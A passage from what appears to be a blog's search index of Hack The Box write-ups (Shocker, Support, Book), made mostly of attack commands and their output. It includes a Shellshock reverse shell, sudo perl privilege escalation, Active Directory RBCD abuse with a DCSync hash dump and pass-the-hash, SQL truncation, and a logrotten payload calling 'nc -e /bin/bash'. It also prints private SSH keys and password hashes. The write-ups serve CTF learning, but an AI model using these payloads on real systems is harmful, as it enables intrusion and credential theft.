uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false syslog:x:104:108::/home/syslog:/bin/false _apt:x:105:65534::/nonexistent:/bin/false lxd:x:106:65534::/var/lib/lxd/:/bin/false messagebus:x:107:111::/var/run/dbus:/bin/false uuidd:x:108:112::/run/uuidd:/bin/false dnsmasq:x:109:65534:dnsmasq,,,:/var/lib/misc:/bin/false sshd:x:110:65534::/var/run/sshd:/usr/sbin/nologin shelly:x:1000:1000:shelly,,,:/home/shelly:/bin/bash\nWe got code execution, grab yourself a reverse shell.\nroot@nidus:/git/htb/shocker# curl -H ‘User-Agent: () { :; }; /bin/bash -i &gt;& /dev/tcp/10.10.14.10/4488 0&gt;&1’ http://10.10.10.56/cgi-bin/user.sh\n[root:/git/htb/shocker]# nc -lvnp 4488 (master✱) listening on [any] 4488 … connect to [10.10.14.10] from (UNKNOWN) [10.10.10.56] 47484 bash: no job control in this shell shelly@Shocker:/usr/lib/cgi-bin$ whoami shelly shelly@Shocker:/usr/lib/cgi-bin$ cat ~/user.txt a66751f2be1833726a055593ef238628\n\n██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████\n██████╗ ██████╗ ██████╗ ████████╗ ██╔══██╗██╔═══██╗██╔═══██╗╚══██╔══╝ ██████╔╝██║ ██║██║ ██║ ██║ ██╔══██╗██║ ██║██║ ██║ ██║ ██║ ██║╚██████╔╝╚██████╔╝ ██║ ╚═╝ ╚═╝ ╚═════╝ ╚═════╝ ╚═╝\n\nThere’s nothing obvious in /home/shelly/, /tmp/, /opt/ or /dev/shm/, lets run ‘sudo -l’ to check if we can exploit any binary.\n\nshelly@Shocker:/dev/shm$ sudo -l Matching Defaults entries for shelly on Shocker: env_reset, mail_badpass, secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin\nUser shelly may run the following commands on Shocker: (root) NOPASSWD: /usr/bin/perl\nshelly@Shocker:/dev/shm$ sudo perl -e ‘exec “/bin/sh”;’ # whoami root # cat /root/root.txt fabc18579c97f3e07d51ac084d01d6fb\n██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████\n██╗███╗ ██╗███████╗ ██████╗ ██████╗ ███╗ ███╗ █████╗ ████████╗██╗ ██████╗ ███╗ ██╗ ██║████╗ ██║██╔════╝██╔═══██╗██╔══██╗████╗ ████║██╔══██╗╚══██╔══╝██║██╔═══██╗████╗ ██║ ██║██╔██╗ ██║█████╗ ██║ ██║██████╔╝██╔████╔██║███████║ ██║ ██║██║ ██║██╔██╗ ██║ ██║██║╚██╗██║██╔══╝ ██║ ██║██╔══██╗██║╚██╔╝██║██╔══██║ ██║ ██║██║ ██║██║╚██╗██║ ██║██║ ╚████║██║ ╚██████╔╝██║ ██║██║ ╚═╝ ██║██║ ██║ ██║ ██║╚██████╔╝██║ ╚████║ ╚═╝╚═╝ ╚═══╝╚═╝ ╚═════╝ ╚═╝ ╚═╝╚═╝ ╚═╝╚═╝ ╚═╝ ╚═╝ ╚═╝ ╚═════╝ ╚═╝ ╚═══╝"
  },
  {
    "objectID": "posts/2022-08-02-htb-writeup-support/2022-08-02-htb-writeup-support.html",
    "href": "posts/2022-08-02-htb-writeup-support/2022-08-02-htb-writeup-support.html",
    "title": "Support - Hack The Box",
    "section": "",
    "text": "USER\n\nStep 1\nnmap:\n➜  support nmap -Pn -n -p- 10.129.146.169\nPORT      STATE SERVICE\n53/tcp    open  domain\n88/tcp    open  kerberos-sec\n135/tcp   open  msrpc\n139/tcp   open  netbios-ssn\n389/tcp   open  ldap\n445/tcp   open  microsoft-ds\n464/tcp   open  kpasswd5\n593/tcp   open  http-rpc-epmap\n636/tcp   open  ldapssl\n3268/tcp  open  globalcatLDAP\n3269/tcp  open  globalcatLDAPssl\n5985/tcp  open  wsman\n9389/tcp  open  adws\n49664/tcp open  unknown\n49667/tcp open  unknown\n49670/tcp open  unknown\n49682/tcp open  unknown\n49699/tcp open  unknown\n61531/tcp open  unknown\n\n\n➜  support nmap -Pn -n -p53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49664,49667,49670,49682,49699,61531 -sCV 10.129.146.169\nPORT      STATE SERVICE       VERSION\n53/tcp    open  domain        Simple DNS Plus\n88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-08-01 08:44:20Z)\n135/tcp   open  msrpc         Microsoft Windows RPC\n139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn\n389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: support.htb0., Site: Default-First-Site-Name)\n445/tcp   open  microsoft-ds?\n464/tcp   open  kpasswd5?\n593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0\n636/tcp   open  tcpwrapped\n3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: support.htb0., Site: Default-First-Site-Name)\n3269/tcp  open  tcpwrapped\n5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-title: Not Found\n|_http-server-header: Microsoft-HTTPAPI/2.0\n9389/tcp  open  mc-nmf        .NET Message Framing\n49664/tcp open  msrpc         Microsoft Windows RPC\n49667/tcp open  msrpc         Microsoft Windows RPC\n49670/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0\n49682/tcp open  msrpc         Microsoft Windows RPC\n49699/tcp open  msrpc         Microsoft Windows RPC\n61531/tcp open  msrpc         Microsoft Windows RPC\nService Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n|_clock-skew: -1s\n| smb2-time: \n|   date: 2022-08-01T08:45:09\n|_  start_date: N/A\n| smb2-security-mode: \n|   3.1.1: \n|_    Message signing enabled and required\n\n\n➜  support sudo nmap -sU 10.129.146.169 --top-ports 100 --open\nPORT    STATE SERVICE\n123/udp open  ntp\nsmbclient:\n➜  support smbclient -L 10.129.146.169\nPassword for [WORKGROUP\\void]:\n\n    Sharename       Type      Comment\n    ---------       ----      -------\n    ADMIN$          Disk      Remote Admin\n    C$              Disk      Default share\n    IPC$            IPC       Remote IPC\n    NETLOGON        Disk      Logon server share \n    support-tools   Disk      support staff tools\n    SYSVOL          Disk      Logon server share \n    \n➜  support smbclient \\\\\\\\10.129.146.169\\\\support-tools\nPassword for [WORKGROUP\\void]:\nsmb: \\&gt; ls\n  .                                   D        0  Wed Jul 20 19:01:06 2022\n  ..                                  D        0  Sat May 28 13:18:25 2022\n  7-ZipPortable_21.07.paf.exe         A  2880728  Sat May 28 13:19:19 2022\n  npp.8.4.1.portable.x64.zip          A  5439245  Sat May 28 13:19:55 2022\n  putty.exe                           A  1273576  Sat May 28 13:20:06 2022\n  SysinternalsSuite.zip               A 48102161  Sat May 28 13:19:31 2022\n  UserInfo.exe.zip                    A   277499  Wed Jul 20 19:01:07 2022\n  windirstat1_1_2_setup.exe           A    79171  Sat May 28 13:20:17 2022\n  WiresharkPortable64_3.6.5.paf.exe      A 44398000  Sat May 28 13:19:43 2022\n\n        4026367 blocks of size 4096. 883481 blocks available    \n\n\nStep 2\nUserInfo has a unique date compared to the other files, and is also one that I don’t recognize directly. Download the file and analyze the contents.\n➜  support unzip UserInfo.exe.zip -d UserInfo\nArchive:  UserInfo.exe.zip\n  inflating: UserInfo/UserInfo.exe   \n  inflating: UserInfo/CommandLineParser.dll  \n  inflating: UserInfo/Microsoft.Bcl.AsyncInterfaces.dll  \n  inflating: UserInfo/Microsoft.Extensions.DependencyInjection.Abstractions.dll  \n  inflating: UserInfo/Microsoft.Extensions.DependencyInjection.dll  \n  inflating: UserInfo/Microsoft.Extensions.Logging.Abstractions.dll  \n  inflating: UserInfo/System.Buffers.dll  \n  inflating: UserInfo/System.Memory.dll  \n  inflating: UserInfo/System.Numerics.Vectors.dll  \n  inflating: UserInfo/System.Runtime.CompilerServices.Unsafe.dll  \n  inflating: UserInfo/System.Threading.Tasks.Extensions.dll  \n  inflating: UserInfo/UserInfo.exe.config\nOpen the .exe binary in dnSpy, go through the code and we find ..\n.. the user which is used to do the ldap queries, support\\ldap. (UserInfo.Services.LdapQuery) \n.. the encrypted password (0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E) for support\\ldap and the function used to decrypt it. (UserInfo.Services.Protected) \nWe can simply extract the password by setting a breakpoint on the return function and look at the values of array. Within we find 36 hex values, throw them into cyberchefand we get:\nhex: 6e764566454b31365e31614d3424653741636c55663878247452577850574f31256c6d7a\nascii: nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz\n\n\nStep 3\nWe can now do ldap queries and find all users:\n➜  support ldapsearch -x -H ldap://10.129.146.169 -D 'support\\ldap' -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b \"DC=support,DC=htb\"\n[... snip ...]\n# support, Users, support.htb\ndn: CN=support,CN=Users,DC=support,DC=htb\nobjectClass: top\nobjectClass: person\nobjectClass: organizationalPerson\nobjectClass: user\ncn: support\nc: US\nl: Chapel Hill\nst: NC\npostalCode: 27514\ndistinguishedName: CN=support,CN=Users,DC=support,DC=htb\ninstanceType: 4\nwhenCreated: 20220528111200.0Z\nwhenChanged: 20220528111201.0Z\nuSNCreated: 12617\ninfo: Ironside47pleasure40Watchful\n\n[... snip ...]\n\n# DnsAdmins, Users, support.htb\ndn: CN=DnsAdmins,CN=Users,DC=support,DC=htb\nobjectClass: top\nobjectClass: group\ncn: DnsAdmins\nauthor: \"0xPThree\"\ndescription: DNS Administrators Group\ndistinguishedName: CN=DnsAdmins,CN=Users,DC=support,DC=htb\ninstanceType: 4\nwhenCreated: 20220528110517.0Z\nwhenChanged: 20220528110517.0Z\nuSNCreated: 12487\nuSNChanged: 12489\nname: DnsAdmins\nWe find a bunch of users, as well as the very interesting DnsAdmins. If you’ve done the box Resolute you probably remember that DnsAdmin group equals instant privesc to Domain Admin using malicious DLL’s, lets have this in mind for later. However, the obvious important thing here is the comment on user Support - Ironside47pleasure40Watchful which probably is his password.\nTry to login with Evil-WinRM on port 5985 and grab user.txt.\n➜  support evil-winrm -i 10.129.146.169 -u support -p Ironside47pleasure40Watchful\n[... snip ...]\n*Evil-WinRM* PS C:\\Users\\support\\Documents&gt; whoami\nsupport\\support\n\n*Evil-WinRM* PS C:\\Users\\support\\Desktop&gt; cat user.txt\ne950252033bf1ad08e45ce24502e4252\n\n\n\n\nROOT\n\nStep 1\nAs previously mentioned, lets start by checking groups and privileges.\n*Evil-WinRM* PS C:\\Users\\support&gt; whoami /all\n\nUSER INFORMATION\n----------------\n\nUser Name       SID\n=============== =============================================\nsupport\\support S-1-5-21-1677581083-3380853377-188903654-1105\n\n\nGROUP INFORMATION\n-----------------\n\nGroup Name                                 Type             SID                                           Attributes\n========================================== ================ ============================================= ==================================================\nEveryone                                   Well-known group S-1-1-0                                       Mandatory group, Enabled by default, Enabled group\nBUILTIN\\Remote Management Users            Alias            S-1-5-32-580                                  Mandatory group, Enabled by default, Enabled group\nBUILTIN\\Users                              Alias            S-1-5-32-545                                  Mandatory group, Enabled by default, Enabled group\nBUILTIN\\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554                                  Mandatory group, Enabled by default, Enabled group\nNT AUTHORITY\\NETWORK                       Well-known group S-1-5-2                                       Mandatory group, Enabled by default, Enabled group\nNT AUTHORITY\\Authenticated Users           Well-known group S-1-5-11                                      Mandatory group, Enabled by default, Enabled group\nNT AUTHORITY\\This Organization             Well-known group S-1-5-15                                      Mandatory group, Enabled by default, Enabled group\nSUPPORT\\Shared Support Accounts            Group            S-1-5-21-1677581083-3380853377-188903654-1103 Mandatory group, Enabled by default, Enabled group\nNT AUTHORITY\\NTLM Authentication           Well-known group S-1-5-64-10                                   Mandatory group, Enabled by default, Enabled group\nMandatory Label\\Medium Mandatory Level     Label            S-1-16-8192\n\n\nPRIVILEGES INFORMATION\n----------------------\n\nPrivilege Name                Description                    State\n============================= ============================== =======\nSeMachineAccountPrivilege     Add workstations to domain     Enabled\nSeChangeNotifyPrivilege       Bypass traverse checking       Enabled\nSeIncreaseWorkingSetPrivilege Increase a process working set Enabled\nWe’re not a member of DnsAdmins, so no quick and easy DA. Before enumerating with winPEAS, lets start by looking at the domain using BloodHound / SharpHound.\n➜  BloodHound git:(master) ✗ impacket-smbserver share . -smb2support\nImpacket v0.10.0 - Copyright 2022 SecureAuth Corporation\n\n[*] Config file parsed\n[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0\n[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0\n[*] Config file parsed\n[*] Config file parsed\n[*] Config file parsed\n*Evil-WinRM* PS C:\\Users\\support\\Documents&gt; cd C:\\Windows\\Tasks\n*Evil-WinRM* PS C:\\Windows\\Tasks&gt; copy \\\\10.10.14.66\\share\\SharpHound.ps1 .\n*Evil-WinRM* PS C:\\Windows\\Tasks&gt; import-module C:\\Windows\\Tasks\\SharpHound.ps1\n*Evil-WinRM* PS C:\\Windows\\Tasks&gt; Invoke-BloodHound -CollectionMethod All -Domain support.htb -LDAPUser support -LDAPPass Ironside47pleasure40Watchful\n*Evil-WinRM* PS C:\\Windows\\Tasks&gt; copy C:\\Windows\\Tasks\\20220801232808_BloodHound.zip \\\\10.10.14.66\\share\\bloodout-out.zip\n\n\nStep 2\nAnalyze the BloodHound output and we quickly see that our user (support) has GenericAll to computer dc.support.htb. \nTo better understand what all different ACL’s mean, we can look on this graph. \nFrom the graph we see that GenericAll means we got full rights over the computer, DC. Looking at the bottom row, and the box named Computer we have two main options. 1. RBCD - Resource Based Constrained Delegation 2. Grant DCSync rights\nThe easiest would be to grant DCSync rights and dump the domain hashes, so lets try that first.\n➜  bloodyAD git:(main) ./bloodyAD.py --host 10.129.20.215 -d support.htb -u support -p Ironside47pleasure40Watchful setDCSync support        \n[*] support SID is: S-1-5-21-1677581083-3380853377-188903654-1105\n[... snip ...]\nldap3.core.exceptions.LDAPInsufficientAccessRightsResult: LDAPInsufficientAccessRightsResult - 50 - insufficientAccessRights - None - 00000005: SecErr: DSID-03152DE9, problem 4003 (INSUFF_ACCESS_RIGHTS), data 0\n - modifyResponse - None\nBut it seems like we dont have the correct access rights, some how. Instead we go for resource based constrained delegation to allow us to impersonate any user of the domain. Obviously we will impersonate the Administrator, grab his Silver Ticket, and dump (DCSync) all domain hashes.\n## Create machine account\n➜  bloodyAD git:(main) ./bloodyAD.py --host 10.129.146.169 -d support.htb -u support -p Ironside47pleasure40Watchful addComputer p3test passwd123\nOpening domain SUPPORT...\nSuccessfully added machine account p3test$ with password passwd123.\n\n## Set resource based constrained delegation\n➜  bloodyAD git:(main) ./bloodyAD.py --host 10.129.146.169 -d support.htb -u support -p Ironside47pleasure40Watchful setRbcd p3test$ dc$                 \n[*] p3test$ SID is: S-1-5-21-1677581083-3380853377-188903654-5601\n[+] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity correctly set\n[+] Delegation rights modified successfully!\n[+] p3test$ can now impersonate users on dc$ via S4U2Proxy\n\n## Get silver ticket\n➜  support impacket-getST -spn ldap/dc.support.htb -impersonate Administrator -dc-ip 10.129.146.169 support.htb/p3test$:passwd123\nImpacket v0.10.0 - Copyright 2022 SecureAuth Corporation\n\n[-] CCache file is not found. Skipping...\n[*] Getting TGT for user\n[*] Impersonating Administrator\n[*]     Requesting S4U2self\n[*]     Requesting S4U2Proxy\n[*] Saving ticket in Administrator.ccache\n\n## Export admin ticket and verify\n➜  support export KRB5CCNAME=Administrator.ccache\n➜  support klist\nTicket cache: FILE:Administrator.ccache\nDefault principal: Administrator@support.htb\n\nValid starting       Expires              Service principal\n08/02/2022 09:35:02  08/02/2022 19:35:02  ldap/dc.support.htb@SUPPORT.HTB\n    renew until 08/03/2022 09:35:10\n\n## Dump hashes (DCSync)\n➜  support impacket-secretsdump dc.support.htb -k -no-pass -just-dc                      \nImpacket v0.10.0 - Copyright 2022 SecureAuth Corporation\n\n[*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash)\n[*] Using the DRSUAPI method to get NTDS.DIT secrets\nAdministrator:500:aad3b435b51404eeaad3b435b51404ee:bb06cbc02b39abeddd1335bc30b19e26:::\n[... snip ...]\nLastly pass-the-hash with Evil-WinRM and grab the root flag.\n➜  support evil-winrm -i 10.129.146.169 -u Administrator -H bb06cbc02b39abeddd1335bc30b19e26\n*Evil-WinRM* PS C:\\Users\\Administrator\\Documents&gt; whoami\nsupport\\administrator\n*Evil-WinRM* PS C:\\Users\\Administrator\\Desktop&gt; cat root.txt\n577a161395a7c12b0a12570153ef2cdd"
  },
  {
    "objectID": "posts/2020-06-05-htb-writeup-book/2020-06-05-htb-writeup-book.html",
    "href": "posts/2020-06-05-htb-writeup-book/2020-06-05-htb-writeup-book.html",
    "title": "Book - Hack The Box",
    "section": "",
    "text": "“Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry’s standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum.”\n\n██╗ ██╗███████╗███████╗██████╗ ██║ ██║██╔════╝██╔════╝██╔══██╗ ██║ ██║███████╗█████╗ ██████╔╝ ██║ ██║╚════██║██╔══╝ ██╔══██╗ ╚██████╔╝███████║███████╗██║ ██║ ╚═════╝ ╚══════╝╚══════╝╚═╝ ╚═╝\n\nroot@p3:/opt/htb/machines/book# nmapAutomatorDirb.sh 10.10.10.176 All PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-title: LIBRARY - Read | Learn | Have Fun Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\nDIRB:\n\nhttp://10.10.10.176:80/books.php (CODE:302|SIZE:0)\nhttp://10.10.10.176:80/contact.php (CODE:302|SIZE:0)\nhttp://10.10.10.176:80/db.php (CODE:200|SIZE:0)\nhttp://10.10.10.176:80/download.php (CODE:302|SIZE:0)\nhttp://10.10.10.176:80/feedback.php (CODE:302|SIZE:0)\nhttp://10.10.10.176:80/home.php (CODE:302|SIZE:0)\nhttp://10.10.10.176:80/index.php (CODE:200|SIZE:6800)\nhttp://10.10.10.176:80/logout.php (CODE:302|SIZE:0)\nhttp://10.10.10.176:80/profile.php (CODE:302|SIZE:0)\nhttp://10.10.10.176:80/search.php (CODE:302|SIZE:0)\nhttp://10.10.10.176:80/settings.php (CODE:302|SIZE:0)\nhttp://book.htb/admin/feedback.php (CODE:302|SIZE:0)\nhttp://book.htb/admin/home.php (CODE:302|SIZE:0)\nhttp://book.htb/admin/index.php (CODE:200|SIZE:6291)\nhttp://book.htb/admin/messages.php (CODE:302|SIZE:0)\nhttp://book.htb/admin/users.php (CODE:302|SIZE:0)\n\nNIKTO:\n\nOSVDB-3092: /admin/: This might be interesting…\nOSVDB-3093: /admin/index.php: This might be interesting… has been seen in web logs from an unknown scanner.\n\nBrowsing the webpage we find a login, where we are able to register an account. While logged in we can find some images, the administrator account name (under Contact) admin@book.htb, and nothing more really interesting.\nVisiting the admin-page (book.htb/admin) we are presented with a similar login page, however we don’t have any valid credentials nor can we create an admin account.\nLooking back at the sign up form we are limited to a username length of 10 characters, and email length of 20 characters. 20 characters is the default column length of a MySQL database, and strings that are longer will be truncated. This means that if we sign up with the email address ‘admin@book.htb randomstring’ which is 47 characters in total, the email will be truncated to ‘admin@book.htb’ (with a trailing whitespace). Now the table will have two admin users; ‘admin@book.htb’ and ‘admin@book.htb’. By default, more relaxed comparison rules are used. One of these relaxations is that trailing space characters are ignored during the comparison. This means the string ‘admin@book.htb’ is still equal to the string ‘admin@book.htb’ in the database.\nWith this in mind we can execute our SQL truncation attack via BurpSuite and/or cURL.\nroot@p3:/opt/htb/machines/book# curl -v book.htb/index.php -H “Content-Type: application/x-www-form-urlencoded” –data “name=admin&email=admin%40book.htb randomstring&password=asdf”\n\nTrying 10.10.10.176:80…\nTCP_NODELAY set\nConnected to book.htb (10.10.10.176) port 80 (#0) &gt; POST /index.php HTTP/1.1 &gt; Host: book.htb &gt; User-Agent: curl/7.67.0 &gt; Accept: / &gt; Content-Type: application/x-www-form-urlencoded &gt; Content-Length: 72 &gt;\nupload completely sent off: 72 out of 72 bytes\nMark bundle as not supporting multiuse &lt; HTTP/1.1 302 Found &lt; Date: Fri, 06 Mar 2020 08:14:31 GMT &lt; Server: Apache/2.4.29 (Ubuntu) &lt; Set-Cookie: PHPSESSID=3okm0p20tnpnf0m808nmg0fiku; path=/ &lt; Expires: Thu, 19 Nov 1981 08:52:00 GMT &lt; Cache-Control: no-store, no-cache, must-revalidate &lt; Pragma: no-cache &lt; location: index.php &lt; Content-Length: 0 &lt; Content-Type: text/html; charset=UTF-8 &lt;\nConnection #0 to host book.htb left intact\n\n\nNow we are able to login on the admin-page with the credentials admin@book.htb:asdf\n\nAs the user, we can launch a LFI XSS attack, using the Book Submission feature. From the noob.ninja website we can just copy and paste the exact script and paste it into the ‘Book Title’- and ‘Author’ fields.\nBy retrieving /etc/passwd we can find the usernames, and from here hopefully grab a SSH private key.\n\nWhen the suggestion has been made, head over to the admin-side of the site and download the new ‘Collections PDF’ which should now contain the content of /etc/passwd.\nIn the PDF we find two users that are allowed to login, root and reader. root:x:0:0:root:/root:/bin/bash reader:x:1000:1000:reader:/home/reader:/bin/bash\nDo the same thing again and grab id_rsa from user reader.\n\nUnfortunately, due to formating we are unable to just copy the content of the pdf to create a usable id_rsa key. Convert it using pdf2txt.py, if you don’t have it you can install if with ‘pip3 install pdfminer.six’.\nroot@nidus:/git/htb/book# pdf2txt.py key.pdf -o reader-id_rsa root@nidus:/git/htb/book# cat book-id_rsa —–BEGIN RSA PRIVATE KEY—– MIIEpQIBAAKCAQEA2JJQsccK6fE05OWbVGOuKZdf0FyicoUrrm821nHygmLgWSpJ G8m6UNZyRGj77eeYGe/7YIQYPATNLSOpQIue3knhDiEsfR99rMg7FRnVCpiHPpJ0 WxtCK0VlQUwxZ6953D16uxlRH8LXeI6BNAIjF0Z7zgkzRhTYJpKs6M80NdjUCl/0 ePV8RKoYVWuVRb4nFG1Es0bOj29lu64yWd/j3xWXHgpaJciHKxeNlr8x6NgbPv4s 7WaZQ4cjd+yzpOCJw9J91Vi33gv6+KCIzr+TEfzI82+hLW1UGx/13fh20cZXA6PK 75I5d5Holg7ME40BU06Eq0E3EOY6whCPlzndVwIDAQABAoIBAQCs+kh7hihAbIi7 3mxvPeKok6BSsvqJD7aw72FUbNSusbzRWwXjrP8ke/Pukg/OmDETXmtgToFwxsD+ McKIrDvq/gVEnNiE47ckXxVZqDVR7jvvjVhkQGRcXWQfgHThhPWHJI+3iuQRwzUI tIGcAaz3dTODgDO04Qc33+U9WeowqpOaqg9rWn00vgzOIjDgeGnbzr9ERdiuX6WJ jhPHFI7usIxmgX8Q2/nx3LSUNeZ2vHK5PMxiyJSQLiCbTBI/DurhMelbFX50/owz 7Qd2hMSr7qJVdfCQjkmE3x/L37YQEnQph6lcPzvVGOEGQzkuu4ljFkYz6sZ8GMx6 GZYD7sW5AoGBAO89fhOZC8osdYwOAISAk1vjmW9ZSPLYsmTmk3A7jOwke0o8/4FL E2vk2W5a9R6N5bEb9yvSt378snyrZGWpaIOWJADu+9xpZScZZ9imHHZiPlSNbc8/ ciqzwDZfSg5QLoe8CV/7sL2nKBRYBQVL6D8SBRPTIR+J/wHRtKt5PkxjAoGBAOe+ SRM/Abh5xub6zThrkIRnFgcYEf5CmVJX9IgPnwgWPHGcwUjKEH5pwpei6Sv8et7l skGl3dh4M/2Tgl/gYPwUKI4ori5OMRWykGANbLAt+Diz9mA3FQIi26ickgD2fv+V o5GVjWTOlfEj74k8hC6GjzWHna0pSlBEiAEF6Xt9AoGAZCDjdIZYhdxHsj9l/g7m Hc5LOGww+NqzB0HtsUprN6YpJ7AR6+YlEcItMl/FOW2AFbkzoNbHT9GpTj5ZfacC hBhBp1ZeeShvWobqjKUxQmbp2W975wKR4MdsihUlpInwf4S2k8J+fVHJl4IjT80u Pb9n+p0hvtZ9sSA4so/DACsCgYEA1y1ERO6X9mZ8XTQ7IUwfIBFnzqZ27pOAMYkh sMRwcd3TudpHTgLxVa91076cqw8AN78nyPTuDHVwMN+qisOYyfcdwQHc2XoY8YCf tdBBP0Uv2dafya7bfuRG+USH/QTj3wVen2sxoox/hSxM2iyqv1iJ2LZXndVc/zLi 5bBLnzECgYEAlLiYGzP92qdmlKLLWS7nPM0YzhbN9q0qC3ztk/+1v8pjj162pnlW y1K/LbqIV3C01ruxVBOV7ivUYrRkxR/u5QbS3WxOnK0FYjlS7UUAc4r0zMfWT9TN nkeaf9obYKsrORVuKKVNFzrWeXcVx+oG3NisSABIprhDfKUSbHzLIR4= —–END RSA PRIVATE KEY—–\nThere are still some formating error on the BEGIN and END part which we can edit manually.\nChange the permission to reader-id_rsa and login to grab user.txt\nroot@nidus:/git/htb/book# chmod 400 reader-id_rsa root@nidus:/git/htb/book# ssh reader@book.htb -i reader-id_rsa reader@book:~$ id uid=1000(reader) gid=1000(reader) groups=1000(reader) reader@book:~$ cat user.txt 51c1d4b5197fa30e3e5d37f8778f95bc\n\n██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████\n██████╗ ██████╗ ██████╗ ████████╗ ██╔══██╗██╔═══██╗██╔═══██╗╚══██╔══╝ ██████╔╝██║ ██║██║ ██║ ██║ ██╔══██╗██║ ██║██║ ██║ ██║ ██║ ██║╚██████╔╝╚██████╔╝ ██║ ╚═╝ ╚═╝ ╚═════╝ ╚═════╝ ╚═╝\n\nEnumerating the box with linpeas and we find very sparse information. We are able to write to the local logfiles making a logrotate privesc possible, however for this to work logrotate must run as root. We can watch if this service is running using pspy64.\nreader@book:/dev/shm$ ./linpeas .. [+] Writable log files (logrotten) [i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#logrotate-exploitation Writable: /home/reader/backups/access.log.1 Writable: /home/reader/backups/access.log\nreader@book:/dev/shm$ ./pspy64 .. 2020/06/07 09:18:59 CMD: UID=0 PID=39210 | /usr/sbin/logrotate -f /root/log.cfg 2020/06/07 09:18:59 CMD: UID=0 PID=39209 | /bin/sh /root/log.sh\nAs both criteria is true I googled for “logrotate privilege escalation” and found the logrotten github, containing the exact commands and scripts needed for this exploit.\nPrepare for the exploit and grab all the files needed from github.\nCopy and paste logrotten.c into the victim machine and compile it. reader@book:/dev/shm$ gcc -o logrotten logrotten.c reader@book:/dev/shm$ chmod +x logrotten\nCopy and paste the payload to a file on the victim machine. reader@book:/dev/shm$ cat payloadfile if [ id -u -eq 0 ]; then (/bin/nc -e /bin/bash 10.10.14.2 4488 &); fi\nExecute the exploit and be fast to grab what you need before the session expires (roughly 10 seconds)\n\nStart logrotten: reader@book:/dev/shm$ ./logrotten -p ./payloadfile /home/reader/backups/access.log Waiting for rotating /home/reader/backups/access.log…\nStart a listener: root@nidus:/opt/scanners/linux# nc -lvnp 4488 listening on [any] 4488 …\nWrite something to access.log to start the logging process: reader@book:~/backups$ pwd /home/reader/backups reader@book:~/backups$ echo “a” &gt; access.log\nLogrotten should now receive the rotation and execute your payload, giving you a shell. Note that it can take a few seconds before you get the shell, depending on the rotation. Once you get the shell you must act quick because the shell will die in about 10 seconds.\nNOTE: For me the exploit didn’t work at first. But changing the order of my different SSH-sessions and all the programs made it work - so play around with that if you don’t get any answer from logrotten.\nreader@book:/dev/shm$ ./logrotten -p ./payloadfile /home/reader/backups/access.log Waiting for rotating /home/reader/backups/access.log… Renamed /home/reader/backups with /home/reader/backups2 and created symlink to /etc/bash_completion.d Waiting 1 seconds before writing payload… Done!\nroot@nidus:/opt/scanners/linux# nc -lvnp 4488 listening on [any] 4488 … connect to [10.10.14.2] from (UNKNOWN) [10.10.10.176] 43498 # # id uid=0(root) gid=0(root) groups=0(root) # pwd /root # cat root.txt 84da92adf998a1c7231297f70dd89714 # cat /root/.ssh/id_rsa —–BEGIN RSA PRIVATE KEY—– MIIEpAIBAAKCAQEAsxp94IilXDxbAhMRD2PsQQ46mGrvgSPUh26lCETrWcIdNU6J cFzQxCMM/E8UwLdD0fzUJtDgo4SUuwUmkPc6FXuLrZ+xqJaKoeu7/3WgjNBnRc7E z6kgpwnf4GOqpvxx1R1W+atbMkkWn6Ne89ogCUarJFVMEszzuC+14Id83wWSc8uV ZfwOR1y/Xqdu82HwoAMD3QG/gu6jER8V7zsC0ByAyTLT7VujBAP9USfqOeqza2UN GWUqIckZ2ITbChBuTeahfH2Oni7Z3q2wXzn/0yubA8BpyzVut4Xy6ZgjpH6tlwQG BEbULdw9d/E0ZFHN4MoNWuKtybx4iVMTBcZcyQIDAQABAoIBAQCgBcxwIEb2qSp7 